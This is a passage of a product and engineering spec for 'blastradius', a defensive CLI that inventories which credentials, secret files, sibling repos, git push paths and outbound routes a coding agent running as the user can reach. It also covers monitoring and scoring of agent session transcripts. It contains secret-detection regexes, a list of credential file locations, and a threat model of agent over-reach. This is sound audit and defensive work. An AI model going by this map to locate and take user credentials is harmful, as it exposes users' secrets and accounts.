# `blastradius` — product & engineering spec (v2.1)

A local self-audit CLI that measures **what a coding agent running as you can currently reach** — credentials, env vars, sibling repos, local secret files, git remotes, likely git write paths, shell-history exposure, outbound egress. **That reachable-surface inventory is the product.** Two comparison modes wrap it as framing: a near-free **worktree run** that shows the *ambient* reach is unchanged (a worktree changes the working directory and nothing else — `$HOME`, env, credential stores, network, SSH keys, git auth, sibling-repo visibility, process authority all persist), and a post-MVP **orchestrator matrix** (Conductor/cmux/ax) that shows which tools actually *contain* that reach.

No exploitation, no injection, no staged malice. Every probe is a benign local read/check reporting only to the user. The tool proves *reachability*, not intent — which is exactly why it runs deterministically in front of someone. The intended effect is **clarity, not fear.**

> **v2.1** folds in the review pass and recalibrates the demo framing (see *Product vs hook*, below). §21 lists what changed and why; §22 is the contract. The reachable-surface inventory (Days 1–2, §17) is the asset and the real line in the sand; the worktree run (Day 3) is near-free framing layered on top — not the product.
> Working name `blastradius`; alt `deputy` (winks at the confused-deputy problem). Name is a 5-minute decision — don't bikeshed.

> **Product vs hook (read this first).** The asset is the *reachable-surface inventory* — the first column. The worktree comparison adds **no new facts** (it's identical by construction); its job is to *earn attention* for that inventory in the broad/mid-tier room, where "a worktree isn't a boundary" still surprises people. It lands **less** on sophisticated fleet operators, who already know worktrees share `$HOME` — demoing it to them can read as missing their setup. So: **lead with the worktree reveal for the broad room; for the three-to-five fleet operators who are the buyer, skip the theater and go straight to inventory breadth + the orchestrator comparison** ("Conductor/cmux inherit all of this — have you audited what your orchestrator actually contains?"). That orchestrator matrix is the buyer's close and matters *more* to them than the worktree compare; it's post-MVP on timeline, not on priority.

---

## 1. Positioning

**One line:** shows what credentials, repos, files, git remotes, and outbound paths a coding agent can reach from your current machine.

**Longer:** a coding agent runs as your user, so it inherits your shell environment, SSH keys, git credentials, cloud profiles, registry tokens, sibling repos, shell history, network egress, and filesystem visibility. `blastradius` makes that ambient authority visible.

**Core claim:** worktrees are useful for parallel development; they are **not** security boundaries — and neither are the orchestrators built on them. The worktree half of that lands on the broad room; the orchestrator half is the non-obvious part, and the part the buyer hasn't audited.

**It proves reachability, not intent.** It does *not* claim the agent is malicious, that a token is valid, that a push would be accepted, or that every secret was found. It *does* claim: these files, stores, remotes, and egress routes are reachable by code running as this user; an agent in the same environment can likely reach the same things; and a worktree alone does not materially constrain that reach.

---

## 2. Primary use cases

1. **Live demo — two registers.** For the broad/mid-tier room, lead with `blastradius compare`: the worktree reveal earns attention, then the inventory (reachable creds, secret env vars, sibling repos, lateral `.env`, git auth surface, push-likelihood, egress) is the substance. For the three-to-five fleet operators who are the actual buyer, skip the worktree theater — they know it — and open with inventory breadth + the orchestrator comparison. Either way it opens a concrete conversation about isolation, credential substitution, egress control, and capability boundaries.
2. **Local self-audit** — `blastradius scan` produces a local report of what a same-user process can reach.
3. **Pre-adoption check at team scale** — `blastradius scan --report` generates Markdown + JSON to spot common exposure patterns across a team, without collecting secret values.
4. **Tooling comparison — the buyer's close (post-MVP).** `blastradius compare --compare-ax` (the orchestrator **matrix**, §13.1) runs the same battery across environments — bare, worktree, and the orchestrators the operator runs (Conductor/cmux/ax) — and shows which actually *contain* the reach. "A worktree shares `$HOME`" is obvious; "the orchestrator you're running inherits that and doesn't interpose on creds or egress either" is not — this is the load-bearing claim for fleet operators. Ships after the single-machine diagnostic on timeline, but it's higher-priority to the buyer than the worktree compare.

---

## 3. Hard non-goals

**Not an exploit tool.** No privilege escalation, config mutation, prompt injection, executing untrusted repo code, running package scripts, reading secret *values* into output, sending findings anywhere, brute-forcing, probing third-party infra, bypassing branch protection, real or dry-run `git push`, or retrieving cloud-metadata credentials. It only asks: what is reachable? **The §23 session scoring layer preserves this:** it is read-only by default (§4.1) and value-free (§4.2); its single state-changing capability is the **opt-in** PreToolUse `block` decision, which the user must explicitly enable. The scorer never executes session commands, never replays traced actions, and never emits secret values — `file_write` diffs and `mcp_call` inputs are dropped/redacted at ingest, command secret-substrings stripped — and every `SessionReport`/`HistoryAuditReport` passes the same Layer-2 redaction sweep (§4.3) and canary self-test (§4.4) as every other renderer. (The §23/§24 layer is implemented — §24.0 — and the canary self-test now includes the transcript/session-report stage, §24.8b. The PreToolUse `block` capability itself remains post-MVP.)

**Not a repo secret scanner.** Not TruffleHog/Gitleaks. It does not crawl git history. It focuses on ambient machine authority. It may *count* `.env`/key-like files in nearby repos; it never extracts their values.

**Not a LAN scanner.** No port scanning, no internal enumeration, no probing arbitrary hosts. The network behavior is exactly one transparent egress reachability check plus a single cloud-metadata reachability check (§12.11), both of which always run and send no findings.

**Not telemetry.** No analytics, no report upload, no phone-home, no hidden beacon. The npm wrapper may contact the artifact host (GitHub Releases) on explicit invocation to download the binary; the binary itself sends no findings or secret values anywhere. Its outbound connections are: the always-on egress reachability probe and cloud-metadata reachability check (§12.11, both send no scan data); when you open the `dashboard`, the browser's fetch of static UI assets/webfonts from a CDN (which carry no scan data); and, only with `--ai`, the value-free findings inventory to the AI provider. The §23/§24 session layer reads agent traces locally and uploads nothing — no traces, scores, or reports leave the machine; a future (post-MVP) PreToolUse hook would return its verdict to the agent harness on the same machine.

---

## 4. Safety & privacy (adoption requirements, not nice-to-haves)

A tool you ask people to run where their agent runs must be more careful than an ordinary utility.

### 4.1 Read-only by default
Default `scan` writes nothing. Allowed writes: terminal output; reports only when explicitly requested (`--report`/`--output`); temporary worktree create/remove in `compare`; OS-temp bookkeeping. No default writes to repo files, shell/git config, credential stores, registry configs, or `$HOME`. The §23 session scoring layer is likewise read-only: ingesting agent traces (transcripts/fixtures) is a read, and the PreToolUse hook's `policy_decision` is a verdict returned to the agent harness, not a mutation — so live scoring and optional blocking stay inside this envelope.

### 4.2 No secret values in output — ever
Never appears in terminal, Markdown, JSON, errors, or logs: access tokens, API keys, private-key material, passwords, `.env` values, shell-history lines, credential URLs with user:pass, bearer tokens, cloud secret keys, registry tokens, kubeconfig certs/tokens.

Allowed: presence, (shortened) path, profile/host/account-alias name, token **length**, env-var **key** name, match **count**, value **length**, coarse confidence. Examples:
```
AWS credentials file present — 2 profiles: default, prod
GITHUB_TOKEN present in env — 40 chars
Shell history contains 3 lines matching known token patterns
```
Never `GITHUB_TOKEN=ghp_...`, never `aws_secret_access_key = ...`.

### 4.3 Redaction: two layers + a self-test
- **Layer 1 — probes collect metadata only.** A probe stores `EnvVarMeta { key, value_len }`, never the value. This is the primary mechanism; safety lives here. The §23 runtime side has an analogous Layer-1 boundary: the `AgentEvent` normalizer (`session/normalize.rs`) strips values — dropping `file_write.diff` bodies and `mcp_call.input` arguments, reducing inline secret assignments and credential URLs in `shell_command` to key + length (the `EnvVarMeta` shape), and sweeping the free-text `approval.reason` — before any event reaches the classifier, scorer, or session report.
- **Layer 2 — final defensive sweep.** Before any render, run a conservative pattern sweep over the serialized output as defense-in-depth: `ghp_`, `github_pat_`, `sk-`, `AKIA`/`ASIA`, `xoxb-`/`xoxp-`, `npm_`, `glpat-`, JWT-shaped strings, PEM private-key blocks, `https://user:pass@host` URLs.
- **Self-test (§4.4)** asserts the layers hold.

> **Dropped from v1:** typed newtypes (`RedactedText`/`SafePath`/`SecretValue`). For a 5-day MVP they're build cost without proportional safety once Layer 1 + the canary self-test exist. Add post-event if desired. *(The redaction type-system is one of two tempting ratholes — see §18.)*

### 4.4 No `--no-redact`; ship a canary self-test instead
A raw-secret runtime flag is a foot-gun for demos, CI logs, and pasted reports. Replace it with:
```
BLASTRADIUS_TEST_SECRET=br_test_SHOULD_NOT_LEAK blastradius self-test-redaction
→ redaction self-test passed
  synthetic secret value was not present in terminal, markdown, json, or dashboard renderers
```
If raw inspection is ever needed, gate it behind a **compile-time** feature, not a runtime flag.

### 4.5 Output is local only
Default stdout. `--report` writes `./blastradius-report.{md,json}`; `--json` / `--markdown` write one format. `--output ./audit` writes reports into `./audit/` and implies both formats when no explicit format flag is provided. Never write outside the requested directory. An existing output directory symlink is rejected. Report files are created private on Unix (`0600`), written through a same-directory temp file, and renamed into place so an existing report-file symlink is replaced rather than followed. The `dashboard` page may load UI assets and webfonts from a CDN purely for rendering; this does not change the local-only guarantee for findings — no scan data, finding, or secret value is ever transmitted by those asset loads.

### 4.6 Egress probe transparency *(revised — see §12.11 for mechanism)*
Document the probe fully in `--help`, `scan --help`, and the README:
```
Network egress probe:
  blastradius checks outbound reachability by resolving a well-known
  hostname and opening a single TLS connection to a major, always-available
  anycast endpoint (1.1.1.1:443), and separately makes one fixed TCP connect
  to the link-local cloud-metadata endpoint. No HTTP body and no findings,
  credentials, paths, env vars, repo names, hostnames, usernames, or machine
  identifiers are sent.

  It reports whether DNS resolution and the TLS handshake succeeded, the
  resolved IP, latency, and whether the metadata endpoint was reachable.

  Any outbound connection necessarily exposes your source IP and a timestamp
  to the destination. The egress target is fixed; there is no configurable
  destination and no way to point the probe at an arbitrary host.
```
If an HTTP request is used instead of a bare TLS connect, headers must be boring (`User-Agent: blastradius/<version>`, `Accept: text/plain`) and carry no identifiers.

---

## 5. Threat model

**Modeled actor:** a coding agent, local tool, script, compromised dependency, or subprocess running **as the current OS user**. It has the user's UID, cwd, inherited env, user-readable files and credential stores, host-permitted egress, and local git config/remotes.

**Not assumed:** root, kernel exploits, physical access, keychain-unlock bypass, network privileges beyond the host's, access to interaction-gated encrypted credentials, or server-side git permissions absent local credentials.

**"Reachable"** = a same-user local process can observe, read, enumerate, connect to, or infer it via ordinary OS APIs (readable file exists; env var present; remote configured; SSH key readable; `.env`/history/sibling-repo readable; DNS+TLS succeed; local git credentials for a host appear present).

**"Reachable" ≠** valid, sufficiently scoped, push-accepted, protection-bypassable, or malicious. Report carefully: prefer "GitHub credentials for github.com appear reachable locally; push may be possible depending on server-side authorization" over "Agent can push to GitHub." The same discipline binds the §23 toxic-combination catalog: a named path (e.g. *exfiltration path*, *production deployment path*) asserts that a reachable ambient capability **composes** with an observed session action — never that exploitation was demonstrated, attempted, or staged.

---

## 6. Product shape

Commands (shipped): `scan` (default), `compare`, `dashboard`, `sessions`, `audit-history`, `self-test-redaction`. Bare `blastradius` ≡ `blastradius scan`. (The old `report`/`version` subcommands were dropped — use `scan --report`; `--version` is clap-native.) `dashboard [--ai]` is the reachable-surface web UI plus opt-in AI attack-scenario narratives. The tool runs **at full power with no scoping/disable flags**: every scan is home-wide, the env-name heuristics + key-name listing are always on, and the egress + cloud-metadata probes always run (§4.6/§12.11).

Shipped session commands (§24): `sessions` (read-only, value-free discovery preview of every agent transcript on disk) and `audit-history` (the retro-hazard scan — join historical sessions against the live reachable surface and rank what "already happened and still matters"). The `dashboard` always runs the retro-hazard scan and renders the real `HistoryAuditReport`. Still **post-MVP — not yet built** (§23): a standalone `score` command and the `dashboard` **three-tab live session view** for an injected single trace, a future `session -- <cmd>` live wrap, and the orchestrator **matrix** — surfaced as `compare --compare-ax` (§13.1).

The CLI is deliberately minimal: the tool always runs at full reach (home-wide sibling search, broad env-name heuristics, key NAMES listed, egress + cloud-metadata probes, and — for the session commands and dashboard — discovery of ALL agent transcripts across ALL time). There are no flags to narrow, scope, or disable any of it.

**`scan`** — run the battery once against the current context.
Flags: `--report` `--json` `--markdown` `--output <dir>` `--fail-on <severity>`.
Behavior: build context from process/cwd/home/platform/git → run the probes (always home-wide; egress + cloud-metadata reachability always run; env-name matching always broad; key names always listed) → render terminal summary → optional MD/JSON → never print values.

**`compare`** — run the battery from the repo root and from a temporary detached worktree off the same commit; render side-by-side. Flags: `--report` `--json` `--markdown` `--output <dir>`. The post-MVP orchestrator matrix is surfaced as `compare --compare-ax` (§13.1). (Details §14.)

**`self-test-redaction`** — run synthetic fixtures through all shipped renderers (terminal, Markdown, JSON, and the `dashboard` page); assert no canary leaks (§4.4). *(Post-MVP, when the §23 layer lands, this will also feed a synthetic trace through the session-report terminal/JSON/dashboard renderers, planting the canary in the dropped `file_write.diff`/`mcp_call.input` fields and a retained `shell_command.command`. That session-renderer coverage is not yet implemented.)*

---

## 7. CLI UX

### 7.1 Trust banner (first lines)
```
blastradius — local reachability audit for coding-agent environments

Privacy:
  • no telemetry   • secret values never leave this machine
  • secret values are never printed
  • network always runs: a fixed egress + cloud-metadata reachability
    check (no scan data sent); only --ai sends the value-free findings
```

### 7.2 Inventory, not a mystery score
Concrete counts beat `Risk: 87/100`. (The §23 session layer's `risk_score` does **not** violate this: it never replaces the inventory — Tab 1 is unchanged — and every point decomposes into a `reasons[]` entry with a `weight` and a `finding_ref` into a real ambient finding, so it is an *explained, drill-downable sum*, not an opaque verdict.) Example:
```
CREDENTIALS      exposed
  AWS            2 profiles reachable: default, prod
  SSH            3 private keys readable
  GitHub         token-like env var present: GITHUB_TOKEN, 40 chars
  .env files     4 files, 31 keys across current repo + siblings
```

### 7.3 Severity (`Info` / `Notable` / `Exposed`)
- **Info** — context, not risk (no siblings; no egress; not a git repo; no `.env`).
- **Notable** — reachable, impact context-dependent (SSH keys readable; history readable; siblings visible; remotes configured; registry config present).
- **Exposed** — same-user process can reach something likely sensitive (secret-named env vars; `.env` with many keys; AWS profiles; GitHub token source; local git credentials for a host; egress open; cloud-metadata reachable).

### 7.4 Confidence (`Confirmed` / `Likely` / `Possible` / `Unknown`)
Report inferred capability separately from severity:
```
push likelihood  likely  — github.com remote + local GitHub credential source
push likelihood  unknown — remote exists, no local credential source detected
```

---

## 8. Architecture

**Language:** single Rust binary — credible to this audience, fast startup, static-ish distribution, strong typing at the redaction boundary, safer fs/process handling than shell.

**MVP platforms:** macOS arm64/x64, Linux x64/arm64. Windows later. (Early agent/orchestrator users skew macOS/Linux.)

**Crates:**
```toml
clap = { version = "4", features = ["derive"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
serde_yaml = "0.9"
toml = "0.8"
regex = "1"
walkdir = "2"
globset = "0.4"
dirs = "5"
tempfile = "3"
anyhow = "1"
thiserror = "1"
url = "2"
reqwest = { version = "0.12", default-features = false, features = ["blocking", "rustls-tls"] } # rustls, no OpenSSL
ctrlc = "3"
tabled = "0.16"
humantime = "2"
```
Shell out only for `git` (and optional read-only helpers).

**Module layout:**
```
src/
  main.rs  cli.rs  context.rs  runner.rs  finding.rs  severity.rs
  report/   { mod.rs terminal.rs markdown.rs json.rs redaction.rs }
  probes/   { mod.rs aws.rs ssh.rs github.rs git_credentials.rs env.rs
              dotenv.rs shell_history.rs sibling_repos.rs lateral_secrets.rs
              git_write.rs egress.rs package_registries.rs docker.rs kube.rs process.rs }
  compare/  { mod.rs worktree.rs diff.rs }
  analyze/  { mod.rs openai.rs }                  # AI explain-only (dashboard --ai, score --ai)
  dashboard/{ mod.rs page.rs }                    # local web UI (three-tab session view, §23)
  session/  { mod.rs trace.rs normalize.rs classify.rs score.rs   # §23/§24 runtime overlay — IMPLEMENTED
              toxic_combinations.rs report.rs retro.rs history.rs discovery/ }   # sessions + audit-history
  util/     { paths.rs git.rs parse.rs net.rs read.rs command.rs fs_budget.rs }
tests/      { redaction.rs fixtures/ }
```

---

## 9. Data model

### 9.1 Context (no raw env values; carries the shared discovery roots)
```rust
pub struct Context {
    pub label: ContextLabel,            // Cwd | RepoRoot | Worktree | Ax | Custom(String)
    pub cwd: PathBuf,
    pub repo_root: Option<PathBuf>,     // MAIN repo root (see §13.8 anchoring)
    pub home: Option<PathBuf>,
    pub platform: Platform,
    pub env: EnvSnapshot,               // Vec<EnvVarMeta { key, value_len }> — no values
    pub git: GitContext,
    pub limits: ScanLimits,
    pub options: ScanOptions,           // output-shaping (env_broad, verbose); egress + cloud-metadata
                                        // reachability always run, so there is no network policy/gating
    pub discovery_roots: Vec<PathBuf>,  // sibling-repo search roots, resolved from MAIN repo;
                                        // in compare, computed ONCE and shared across contexts
}
```

### 9.2 GitContext
```rust
pub struct GitContext {
    pub is_repo: bool,
    pub repo_root: Option<PathBuf>,
    pub git_dir: Option<PathBuf>,
    pub current_branch: Option<String>,
    pub head_sha_short: Option<String>,
    pub default_branch_guess: Option<String>,
    pub remotes: Vec<GitRemote>,        // { name, raw_url_redacted, host, protocol }
}
```

### 9.3 Finding / Class / Scope / Probe
```rust
pub struct Finding {
    pub id: FindingId, pub class: FindingClass, pub scope: FindingScope,
    pub title: String, pub summary: String,
    pub severity: Severity, pub confidence: Confidence,
    pub evidence: serde_json::Value,    // structured, redacted (counts/names/paths)
    pub remediation: Vec<String>,
}

pub enum FindingClass { Credentials, CrossRepo, GitWrite, Egress, Process, HostPersistence, SystemInfo }
pub enum FindingScope { Ambient, CurrentRepo, SiblingRepos, Network, Host }
```
`FindingScope` is what makes `compare` honest. **Blast-radius-relevant scopes are `Ambient`, `SiblingRepos`, `Network`, `Host`** — these are expected to be identical across worktrees. `CurrentRepo` is *allowed to differ* (untracked files like a local `.env` won't exist in a `HEAD` worktree). Examples: AWS creds in `$HOME` = `Ambient`; secret env vars = `Ambient`; `.env` in current repo = `CurrentRepo`; `.env` in siblings = `SiblingRepos`; sibling enumeration = `SiblingRepos`; HTTPS egress = `Network`; git credentials for a host = `Ambient`; current repo remote = `CurrentRepo`.

```rust
pub trait Probe {
    fn id(&self) -> &'static str;
    fn class(&self) -> FindingClass;
    fn run(&self, ctx: &Context) -> anyhow::Result<Vec<Finding>>;
}
```
Runner: deterministic order; catch probe-level errors and continue; surface probe errors as `Info` only when useful; never panic on malformed local files; enforce time/traversal/subprocess budgets. Read-only subprocesses are non-interactive (`GIT_TERMINAL_PROMPT=0`, askpass disabled) and time-bounded so a wrapped or slow `git` degrades instead of hanging the scan. Subprocess lookup skips empty/relative PATH entries and PATH directories inside the command cwd so a repo-local fake `git` cannot be selected by `PATH=.:...` or `PATH=$PWD/bin:...`. **Probes return structured metadata only** — `{ "profiles": ["default","prod"], "profile_count": 2 }`, never key material.

---

## 10. Scan limits & filesystem rules

Traversal can be expensive and invasive — make limits explicit.

**Defaults:** `max_depth_home_roots: 4`, `max_sibling_repos: 200`, `max_files_examined_per_repo: 5000`, `max_history_bytes_per_file: 50 MB`, `max_dotenv_bytes: 2 MB`, `follow_symlinks: false`, `cross_filesystems: false` (Linux).

**Symlinks:** not followed by default (avoids loops, surprising mounts, accidental exposure; keeps demos fast/deterministic).

**Ignored dirs:** `node_modules`, `.git/objects`, `target`, `dist`, `build`, `.cache`, `Library/Caches`, `Applications`, `venv`, `.venv`, `__pycache__`, `.DS_Store`, `Trash`.

**Sibling-repo candidate roots (deduped by canonical path):** `dirname(MAIN_repo_root)`, `~/code`, `~/Code`, `~/src`, `~/projects`, `~/Projects`, `~/dev`, `~/work`, `~/repos`, `~/workspace`. Do **not** recurse all of `$HOME` in MVP; `--home-wide` opts in. **Anchoring rule (load-bearing): see §13.8.**

---

## 11. Probe catalog

**MVP (`●`) — ship first**
- *Credentials:* AWS profiles · SSH private keys · GitHub/token source (local read only) · git credential store · secret-named env vars · `.env` discovery + key counts · shell-history token-pattern counts
- *Cross-repo:* sibling-repo enumeration · lateral `.env`/key-file counting
- *Git write:* remote inventory · local credential-source matching · push-likelihood inference · branch/default-branch warning
- *Egress:* DNS + single TLS connect to neutral host (always runs)
- *Compare:* temp worktree harness · normalized side-by-side diff · cleanup

**Shipped since MVP (`✔`)** — the credential surface is now a **spec-driven store family** (`src/probes/store.rs`: one `StoreSpec` per store, run by one engine; add a store = add a data entry, see `src/probes/registry.rs`): npm/pypi/cargo tokens · Docker registry auth · kubeconfig cluster/context names · GCP/Azure config · HashiCorp Vault · Terraform Cloud · `.pgpass` hosts · GPG secret-key count. Plus bespoke probes: ssh-agent socket reachability (loaded-identity count) · dangerous git-config exec/redirect directives · writable Claude Code control & instruction surface · cloud-metadata reachability · Linux `/proc/*/environ` same-user exposure · writable shell rc · git-hooks writability.

**Also shipped** — browser session/cookie stores · cron/systemd-timer enumeration · ptrace/memory-introspection + `/proc/*/cmdline` secrets · reachable localhost datastores · local privilege escalation (groups + NOPASSWD sudo) · gpg-agent reach · network-config tampering · editor/login exec dotfiles · ~35-store credential family (build-tool/data/secrets-manager/VPN/mail/etc.) · **storytelling AI dashboard** (`dashboard [--ai]`) — a scrollytelling web page (value-free, swept; React/Babel + webfonts via CDN) whose reachable-surface *denominator* is live (expanding-radius tallies + per-ring finding chips + full inventory) plus opt-in AI attack-scenario narratives. Its retro-hazard section is **live** — it renders the real `HistoryAuditReport` from discovered transcripts (the §24 engine is shipped); only the per-session **single-trace** scoring view remains an illustrative post-MVP fixture, labeled as such on the page. See `docs/claude-code-security-model.md §6a` for the full coverage map.

**Shipped (§23/§24, implemented 2026-06-13).** The session blast-radius **scoring engine** (`src/session/`: classify/score/toxic-combinations/report) and **automatic transcript ingestion + retro-hazard detection** (discovery + retro + history) are built and tested, exposed as the `sessions` and `audit-history` commands; the `dashboard` discovers transcripts and renders the real retro `HistoryAuditReport`. **Still post-MVP (`○`):** a standalone `score` command (its function ships as `audit-history`); the dashboard's three-tab **live single-trace** view (Session Timeline + Blast Radius & Response); the PreToolUse `--hook`/`block`; `session -- <cmd>` live wrapping; and native parsers beyond Claude Code / Codex (other agents are detection-only). The reachable-surface inventory remains the product and the §22 contract.

**Post-MVP (`○`)** — sibling-repo remote inventory · benchmark matrix · browser-key decryption-key reachability · desktop-app (Slack/Discord/Thunderbird) local state.

---

## 12. Detailed probe specs

### 12.1 AWS credentials
Stat `~/.aws/credentials`, `~/.aws/config` (respect `AWS_SHARED_CREDENTIALS_FILE`/`AWS_CONFIG_FILE`, rendered as safe paths). INI-parse **profile names** only (`[prod]` → `prod`; `[profile staging]` → `staging`). No values, no STS, no network.
Evidence `{ "files":[...], "profile_count":2, "profiles":["default","prod"] }`. Severity: `Exposed` if creds file with ≥1 profile; `Notable` if only config; `Info` if absent. Remediation: per-agent AWS creds, narrow + short-lived; don't mount broad `~/.aws` into agent envs.

### 12.2 SSH private keys
Glob `~/.ssh/id_*`, `*_rsa|_ed25519|_ecdsa`; parse `~/.ssh/config`. Exclude `*.pub`, `known_hosts`, `authorized_keys`, `config`. Treat as private key if regular, readable, non-`.pub`, and first KB contains a `-----BEGIN ... PRIVATE KEY-----` header. No contents. Config: collect Host aliases only.
Evidence `{ "key_count":3, "paths":[...], "configured_hosts":["github.com","prod-bastion"] }`. Severity `Exposed`/`Notable`/`Info`. **Precision:** don't claim keys are unencrypted/usable — say "3 private key files readable; passphrase status not checked."

### 12.3 GitHub / token source — **local read only, never queries GitHub**
Do **not** call GitHub or run `gh auth status` (that contacts the network). Read local: `~/.config/gh/hosts.yml` (and `~/Library/Application Support/GitHub CLI/hosts.yml`, respecting `XDG_CONFIG_HOME`). Env vars `GITHUB_TOKEN`/`GH_TOKEN`/`GITHUB_PAT` come via §12.5. Report host, user (if present), `token_present`, `token_len`; never the token. **Scopes require a GitHub API call, which this probe never makes**, so:
```
GitHub token source present for github.com; scopes not checked (no GitHub API call)
```
Optional future `--allow-auth-checks` may fetch scopes after clearly disclosing the network call.
Evidence `{ "hosts":[{"host":"github.com","user":"octocat","token_present":true,"token_len":40,"scopes_checked":false}] }`.

### 12.4 Git credential store
Read `~/.git-credentials`, `~/.netrc`/`~/_netrc`; read global helpers via `git config --global --get-all credential.helper` (read-only). Recognize `store|cache|osxkeychain|manager|manager-core|libsecret|wincred`. From `.git-credentials` report only `{ "host":"github.com","username_present":true,"password_present":true }` — never the URL. From `.netrc` report machine names + whether login/password fields appear.
Evidence `{ "helpers":["store","osxkeychain"], "stored_hosts":["github.com"], "netrc_hosts":["api.heroku.com"] }`. Severity: `Exposed` if plaintext readable creds; `Notable` if only helper; `Info` if absent.

### 12.5 Environment-variable secret-names — **REWRITTEN (curated-first; broad regex is opt-in)**
Scan env **names, never values.** Two tiers:

1. **High-signal curated set drives `Exposed`** (this is the demo path — precise, no embarrassing false positives):
   `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, `GITHUB_TOKEN`, `GH_TOKEN`, `GITHUB_PAT`, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `NPM_TOKEN`, `PYPI_TOKEN`, `SLACK_BOT_TOKEN`, `DATABASE_URL`, `SUPABASE_SERVICE_ROLE_KEY`, `STRIPE_SECRET_KEY`, `HF_TOKEN`, `GITLAB_TOKEN`, `DIGITALOCEAN_TOKEN`, `CLOUDFLARE_API_TOKEN` (extend as needed).
2. **Broad heuristic** — `(?i)(TOKEN|SECRET|PASSWORD|PASSWD|API[_-]?KEY|ACCESS[_-]?KEY|PRIVATE[_-]?KEY|CREDENTIAL|AUTH|BEARER)`. The heuristic is **always on** (full-power default — there is no `--env-broad` flag to disable it), but heuristic-only matches are capped at `Notable` (never `Exposed`), so an ordinary var can never be mislabeled `Exposed`; only the curated set drives `Exposed`.

**Suppress known-non-secret keys always:** `SSH_AUTH_SOCK`, `GPG_TTY`, `LESSKEY`, `KEYMAP`, `XDG_*`, `LC_*`, `TERM*`. (Note: `HOMEBREW_GITHUB_API_TOKEN` is a real token — it is **not** suppressed.)

Output `secret-like env vars reachable: GITHUB_TOKEN(40), OPENAI_API_KEY(51)`.
Evidence `{ "matches":[{"key":"GITHUB_TOKEN","value_len":40}], "count":1, "via":"curated" }`.
Severity: `Exposed` for curated hits; `Notable` for heuristic-only hits; `Info` if none. Conservative by design — false positives destroy trust in exactly the room you're demoing to.

### 12.6 `.env` discovery
Search current repo (`cwd`, repo root, parents → home) and sibling repos (bounded). Patterns `.env`, `.env.*`, `*.env`, `.envrc`; exclude `.env.example|.sample|.template|.defaults`. Read ≤ `max_dotenv_bytes`; parse **keys** via `^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=`; ignore comments/blank; never store values. Separate current-repo vs siblings:
```
.env files reachable
  current repo: 1 file, 12 keys
  sibling repos: 3 files, 27 keys across 3 repos
```
Evidence `{ "current_repo":{"file_count":1,"key_count":12}, "sibling_repos":{"repo_count":3,"file_count":3,"key_count":27} }`. Output lists key **names** only, never values — always on (full-power default; there is no `--verbose` flag to disable it). Severity `Exposed` if non-example `.env` found; else `Info`.

### 12.7 Shell-history token patterns
Check `~/.zsh_history`, `~/.bash_history`, `~/.history`, `~/.local/share/fish/fish_history` (respect size cap). Match `(?i)\b(export|set|env)\s+[A-Za-z_][A-Za-z0-9_]*(TOKEN|SECRET|PASSWORD|API_KEY|ACCESS_KEY)`; token prefixes `ghp_|github_pat_|sk-|AKIA|ASIA|xoxb-|xoxp-|npm_|glpat-`; credential URLs `https?://[^/\s:]+:[^@\s]+@`. **Never print lines or matched substrings** — counts by file/category only.
```
shell history contains 3 secret-looking lines across zsh history
```
Evidence `{ "files":[{"path":"~/.zsh_history","matches":3,"categories":["token_prefix","export_secret"]}], "total_matches":3 }`. Severity `Exposed`/`Notable`/`Info`.

### 12.8 Sibling-repo enumeration — **ANCHORING FIX (Fix 1)**
Search candidate roots for git repos (`.git/` dir, or a `.git` **file** pointing to a gitdir — which is what linked worktrees have). Exclude the current repo; dedupe canonical paths; never run repo code; never read history.

> **The anchoring rule (this is a correctness bug if missed, and it self-owns the demo):** `git rev-parse --show-toplevel` run *inside a linked worktree* returns the **worktree's** path (e.g. `$TMPDIR/blastradius-worktree-…`), not the main repo. So a discovery root computed as `dirname(repo_root)` resolves to `$TMPDIR` in the worktree context — which has **no neighbors** — and the worktree column would show *fewer* siblings, making it look like the worktree reduced reach: the exact inverse of the thesis.
>
> **Therefore:** `discovery_roots` is resolved from the **main** repo (capture it before creating the worktree; or resolve via `git rev-parse --git-common-dir` and derive the main toplevel) and stored on the `Context`. In `compare`, the root set is computed **once** and the **same set is handed to both contexts** — the worktree context does **not** recompute roots from its own cwd. Reachability is a property of the user's authority, not the cwd's neighborhood, and the heuristic must reflect that.

Output `23 sibling repos readable from here` (show ≤10 shortened paths, then `+13 more`). Evidence `{ "count":23, "shown":["~/code/api","~/code/web"], "truncated":true }`. Severity: `Exposed` if siblings contain lateral secret files; `Notable` if siblings found; `Info` if none.

### 12.9 Lateral secret reach
Using the sibling list, scan bounded paths for `.env`, `.env.*`, `*.env`, `*.pem`, `*.key`, `id_rsa`, `id_ed25519`, `service-account*.json`, `credentials.json` (exclude examples). Count `.env` keys; count key-like files. Never read values.
```
secrets present in 7 sibling repos
```
Evidence `{ "repos_with_secret_like_files":7, "dotenv_files":8, "dotenv_keys":91, "key_like_files":4 }`. Severity `Exposed`/`Notable`/`Info`.

### 12.10 Git remote & push-likelihood — **"push likelihood," not "can push"**
Read-only: `git remote -v`, `git branch --show-current`, `git symbolic-ref refs/remotes/origin/HEAD`, `git config --get remote.origin.url`. Normalize `git@github.com:o/r.git` / `https://…` / `ssh://…` → `{ host, protocol }`. **Never push, and no dry-run push** (it contacts the remote and can trigger hooks/auth). Infer push likelihood from: readable SSH keys + SSH remote; gh token source for github.com; `GITHUB_TOKEN`/`GH_TOKEN` for GitHub; credential-store host match; `.netrc` host match.
```
git remotes
  origin  github.com over ssh
push likelihood
  likely — ssh remote plus readable SSH private key files
```
Evidence `{ "remotes":[{"name":"origin","host":"github.com","protocol":"ssh"}], "push_likelihood":"likely", "basis":["ssh_remote","readable_ssh_private_keys"] }`. **Branch protection is server-side** — report it as unverified:
```
current branch: main
default branch guess: main
branch protection is server-side; not verified by this local scan
```
Severity: `Exposed` if push likely; `Notable` if remotes but source unknown; `Info` if none.

### 12.11 Egress — **fixed anycast target, no first-party SPOF**
Goal: "can a process make outbound connections from here?" Don't make the answer depend on infra you stood up the night before, and don't make yourself the host logging every attendee's IP.

**Mechanism (always runs):** resolve a well-known hostname + open a single **TLS connection** to a major always-up anycast endpoint (`1.1.1.1:443`), no HTTP body. Measure handshake latency; send nothing. The target is fixed in the binary — there is no configurable destination and no way to point the probe at an arbitrary host. The egress probe and the §extra cloud-metadata reachability check (one fixed TCP connect to the link-local IMDS endpoint) are not gated by any flag.
